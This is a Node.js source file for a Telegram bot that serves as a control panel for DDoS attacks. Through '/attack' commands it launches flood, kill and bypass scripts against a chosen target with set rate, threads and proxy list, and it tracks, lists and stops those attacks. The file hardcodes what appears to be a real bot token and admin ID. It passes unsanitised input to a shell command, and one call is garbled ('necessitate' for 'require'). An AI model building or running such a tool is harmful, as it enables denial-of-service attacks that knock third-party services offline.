const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const si = necessitate('systeminformation');
const express = require('express');
const app = express();
const bot = new TelegramBot('7937745403:AAGv0jQPQPZZcQYMauM5xNeKVxMIU5LOLgk', { polling: true });
const ADMIN_ID = 6601930239;
const PORT = process.env.PORT || 3000;

let attacks = [];

app.get('/', (req, res) => res.send('Bot is running'));

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (chatId !== ADMIN_ID) return bot.sendMessage(chatId, 'Access denied.');

  if (!msg.text.startsWith('/')) return;
  const args = msg.text.slice(1).split(' ');
  const command = args.shift().toLowerCase();

  if (command === 'attack') {
    const [method, target, time] = args;
    if (!['flood', 'kill', 'bypass'].includes(method) || !target || !time) {
      return bot.sendMessage(chatId, 'Usage: /attack [method](flood,kill,bypass) [target] [time]');
    }

    const rate = 25;
    const thread = 10;
    const proxyfile = 'prx.txt';
    const attack = { method, target, time: parseInt(time), rate, thread, proxyfile, messageId: null, status: 'start' };
    attacks.push(attack);

    const systemInfo = await si.get({
      cpu: 'manufacturer,brand,speed,cores',
      mem: 'total,free,used',
      fsSize: 'fs,size,used,available',
      osInfo: 'platform,distro,release'
    });

    const embed = {
      parse_mode: 'Markdown',
      text: `*Status*: ${attack.status}\n*Method*: ${attack.method}\n*Target*: ${attack.target}\n*Time*: ${attack.time}\n*Rate*: ${attack.rate}\n*Thread*: ${attack.thread}\n*Proxyfile*: ${attack.proxyfile}\n*System*: \`\`\`json\n${JSON.stringify(systemInfo, null, 2)}\n\`\`\``
    };

    const sentMessage = await bot.sendMessage(chatId, embed.text, { parse_mode: embed.parse_mode });
    attack.messageId = sentMessage.message_id;

    setTimeout(async () => {
      attack.status = 'run';
      attack.time -= 5;
      await bot.editMessageText(
        `*Status*: ${attack.status}\n*Method*: ${attack.method}\n*Target*: ${attack.target}\n*Time*: ${attack.time}\n*Rate*: ${attack.rate}\n*Thread*: ${attack.thread}\n*Proxyfile*: ${attack.proxyfile}\n*System*: \`\`\`json\n${JSON.stringify(systemInfo, null, 2)}\n\`\`\``,
        { chat_id: chatId, message_id: attack.messageId, parse_mode: 'Markdown' }
      );

      const interval = setInterval(async () => {
        attack.time -= 5;
        if (attack.time <= 0) {
          clearInterval(interval);
          attacks = attacks.filter(a => a !== attack);
          await bot.deleteMessage(chatId, attack.messageId);
          await bot.sendMessage(chatId, `Attack ${attack.method} on ${attack.target} completed.`);
          return;
        }

        await bot.editMessageText(
          `*Status*: ${attack.status}\n*Method*: ${attack.method}\n*Target*: ${attack.target}\n*Time*: ${attack.time}\n*Rate*: ${attack.rate}\n*Thread*: ${attack.thread}\n*Proxyfile*: ${attack.proxyfile}\n*System*: \`\`\`json\n${JSON.stringify(systemInfo, null, 2)}\n\`\`\``,
          { chat_id: chatId, message_id: attack.messageId, parse_mode: 'Markdown' }
        );
      }, 5000);

      exec(`node ${method}.js ${target} ${time} ${rate} ${thread} ${proxyfile}`, (error) => {
        if (error) {
          clearInterval(interval);
          attacks = attacks.filter(a => a !== attack);
          bot.deleteMessage(chatId, attack.messageId);
          bot.sendMessage(chatId, `Attack ${attack.method} on ${attack.target} failed.`);
        }
      });
    }, 5000);
  }

  if (command === 'list') {
    if (attacks.length === 0) {
      return bot.sendMessage(chatId, 'No active attacks.');
    }

    const text = attacks.map((attack, index) => `*Attack ${index}*\nMethod: ${attack.method}\nTarget: ${attack.target}\nTime: ${attack.time}\nStatus: ${attack.status}`).join('\n\n');
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  }

  if (command === 'stop') {
    const index = parseInt(args[0]);
    if (isNaN(index) || index < 0 || index >= attacks.length) {
      return bot.sendMessage(chatId, 'Invalid attack index.');
    }

    const attack = attacks[index];
    attacks = attacks.filter(a => a !== attack);
    await bot.deleteMessage(chatId, attack.messageId);
    await bot.sendMessage(chatId, `Attack ${attack.method} on ${attack.target} stopped.`);
  }

  if (command === 'system') {
    const systemInfo = await si.get({
      cpu: 'manufacturer,brand,speed,cores',
      mem: 'total,free,used',
      fsSize: 'fs,size,used,available',
      osInfo: 'platform,distro,release'
    });

    bot.sendMessage(chatId, `*System*: \`\`\`json\n${JSON.stringify(systemInfo, null, 2)}\n\`\`\``, { parse_mode: 'Markdown' });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
